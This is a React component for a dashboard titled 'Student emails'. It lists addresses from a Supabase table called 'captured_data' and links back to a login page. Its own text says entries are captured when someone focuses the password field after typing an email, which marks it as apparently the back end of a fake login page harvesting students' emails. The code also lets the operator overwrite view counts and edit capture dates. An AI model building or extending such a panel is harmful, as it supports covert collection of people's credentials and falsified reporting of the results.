import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { supabase } from "./supabaseClient"; 

export default function Counter() {
  const [records, setRecords] = useState([]);
  const [pageViews, setPageViews] = useState(0);

  const updateDashboard = async () => {
    const { data: emailData } = await supabase
      .from('captured_data')
      .select('*')
      .order('id', { ascending: false });

    if (emailData) {
      const cleanedRecords = emailData.map(record => {
        if (record.saved_at && record.saved_at.includes(',')) {
          return { ...record, saved_at: record.saved_at.split(',')[0] };
        }
        return record;
      });
      setRecords(cleanedRecords);
    }

    const { data: viewData } = await supabase
      .from('analytics')
      .select('view_count')
      .eq('id', 1)
      .single();

    if (viewData) {
      setPageViews(viewData.view_count);
    }
  };

  useEffect(() => {
    document.title = "Student Emails Dashboard";
    updateDashboard();
  }, []);

  const handleEditViews = async () => {
    const newCount = window.prompt("Modify total login page open metrics:", pageViews);
    if (newCount === null || newCount.trim() === "" || isNaN(newCount)) return;
    
    const targetInt = parseInt(newCount);

    const { error } = await supabase
      .from('analytics')
      .update({ view_count: targetInt })
      .eq('id', 1);

    if (!error) {
      setPageViews(targetInt);
    }
  };

  const handleEditDate = async (indexToEdit, e) => {
    if (e.target.closest('.delete-btn')) return;

    const currentRecord = records[indexToEdit];
    // FIXED: Changed from .savedAt to match your database .saved_at
    const newDate = window.prompt(`Edit date for ${currentRecord.email}:`, currentRecord.saved_at);
    
    if (newDate === null || newDate.trim() === "") return;

    const { error } = await supabase
      .from('captured_data')
      .update({ saved_at: newDate.trim() })
      .eq('id', currentRecord.id);

    if (!error) updateDashboard();
  };

  const handleDeleteRow = async (id, emailAddress, e) => {
    e.stopPropagation();
    if (window.confirm(`Delete ${emailAddress}?`)) {
      const { error } = await supabase
        .from('captured_data')
        .delete()
        .eq('id', id);

      if (!error) updateDashboard(); 
    }
  };

  const visibleRecords = records.slice(0, 250);

  return (
    <>
      <style>{`
        :root { --font-sans: ui-sans-serif, system-ui, sans-serif; --font-mono: ui-monospace, monospace; }
        .dashboard-body { background-color: #0b0f19; min-height: 100vh; width: 100%; display: flex; align-items: center; justify-content: center; font-family: var(--font-sans); padding: 40px 16px; box-sizing: border-box; }
        .dashboard-main { width: 100%; max-width: 768px; margin: 0 auto; }
        .dashboard-card { background-color: #111827; color: #ffffff; border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 18px 60px rgba(0, 0, 0, 0.55); padding: 24px; box-sizing: border-box; }
        .header-row { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; }
        .main-title { font-size: 20px; font-weight: 600; margin: 0; }
        .sub-title { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-top: 4px; }
        .status-badge { font-size: 12px; padding: 4px 8px; border-radius: 9999px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.1); white-space: nowrap; }
        .stats-grid { margin-top: 32px; display: grid; gap: 16px; grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .stat-box { background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 20px; }
        .stat-box.editable { cursor: pointer; transition: background 0.15s; }
        .stat-box.editable:hover { background-color: rgba(255, 255, 255, 0.03); }
        .stat-label { font-size: 14px; color: rgba(255, 255, 255, 0.7); }
        .stat-number { margin-top: 8px; font-size: 48px; font-weight: 600; letter-spacing: -0.025em; font-variant-numeric: tabular-nums; }
        .stat-desc { margin-top: 8px; font-size: 12px; color: rgba(255, 255, 255, 0.5); }
        .table-section { margin-top: 24px; background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; overflow: hidden; }
        .table-header { padding: 12px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); font-size: 14px; font-weight: 500; color: rgba(255, 255, 255, 0.8); }
        .table-scroll { overflow-x: auto; max-height: 420px; overflow-y: auto; }
        .data-table { width: 100%; text-align: left; font-size: 14px; border-collapse: collapse; }
        .data-table thead { position: sticky; top: 0; background-color: #0f172a; color: rgba(255, 255, 255, 0.6); z-index: 10; }
        .data-table th { padding: 8px 16px; font-weight: 500; }
        .data-row { border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: background 0.15s; cursor: pointer; user-select: none; }
        .data-row:hover { background-color: rgba(255, 255, 255, 0.05); }
        .data-cell-email { padding: 12px 16px; font-family: var(--font-mono); color: rgba(255, 255, 255, 0.9); word-break: break-all; }
        .data-cell-date { padding: 12px 16px; color: rgba(255, 255, 255, 0.6); white-space: nowrap; }
        .delete-btn { background: transparent; color: #ef4444; border: none; padding: 6px 12px; font-size: 12px; font-weight: 500; cursor: pointer; border-radius: 4px; transition: all 0.15s; }
        .delete-btn:hover { background: rgba(239, 68, 68, 0.15); color: #f87171; }
        .portal-link { font-size: 11px; color: rgba(255, 255, 255, 0.4); text-decoration: underline; margin-top: 4px; display: inline-block; }
        .empty-text { padding: 24px; text-align: center; color: rgba(255, 255, 255, 0.4); font-size: 14px; margin: 0; }
      `}</style>

      <div className="dashboard-body">
        <main className="dashboard-main">
          <section className="dashboard-card">
            
            <div className="header-row">
              <div>
                <h1 className="main-title">Student emails</h1>
                <p className="sub-title">Captured metrics panel configuration.</p>
              </div>
              <div style={{ textAlign: 'right' }}>
                <div className="status-badge">Realtime: on</div>
                <Link to="/" className="portal-link">&larr; Go to Login</Link>
              </div>
            </div>

            <div className="stats-grid">
              <div className="stat-box">
                <div className="stat-label">Total saved</div>
                {/* FIXED: Keeps 0 rendering natively as an explicit numerical block */}
                <div className="stat-number">{records.length}</div>
              </div>
              
              <div className="stat-box editable" onClick={handleEditViews} title="Click to override view count metrics">
                <div className="stat-label">Page Opened</div>
                {/* FIXED: Displays natural view state accurately */}
                <div className="stat-number">{pageViews}</div>
                <p className="stat-desc">Tracks total initial landings on form interface portals.</p>
              </div>
            </div>

            <div className="table-section">
              <div className="table-header">Emails</div>
              <div className="table-scroll">
                <table className="data-table">
                  <thead>
                    <tr>
                      <th style={{ width: '50%' }}>Email</th>
                      <th style={{ width: '30%' }}>Saved at</th>
                      <th style={{ width: '20%', textAlign: 'center' }}>Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visibleRecords.map((record, index) => (
                      <tr key={index} onClick={(e) => handleEditDate(index, e)} className="data-row">
                        <td className="data-cell-email">{record.email}</td>
                        <td className="data-cell-date">{record.saved_at}</td> 
                        <td style={{ textAlign: 'center', padding: '8px' }}>
                          <button 
                            className="delete-btn" 
                            onClick={(e) => handleDeleteRow(record.id, record.email, e)}
                          >
                            Remove
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {records.length === 0 && (
                <p className="empty-text">
                  No rows yet. Entries appear after someone focuses the password field with a valid email in the username field.
                </p>
              )}
            </div>

          </section>
        </main>
      </div>
    </>
  );
}